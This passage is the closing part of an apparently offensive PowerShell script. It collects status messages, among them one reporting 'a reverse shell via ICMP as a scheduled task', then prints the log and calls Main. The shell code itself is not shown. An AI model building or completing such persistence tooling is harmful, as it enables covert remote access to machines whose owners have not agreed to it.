        $finalOutput += -join("`n - Adding a reverse shell via ICMP as a scheduled task:", (Change-Message $schedICMP))
    }

    $finalOutput += -join("`nFinished at ", (Get-Date -Format "HH:mm:ss on dd/MM/yyyy"))

    
    ##### Write output #####

    Write-Output $finalOutput
}


##### Entry point #####

Main
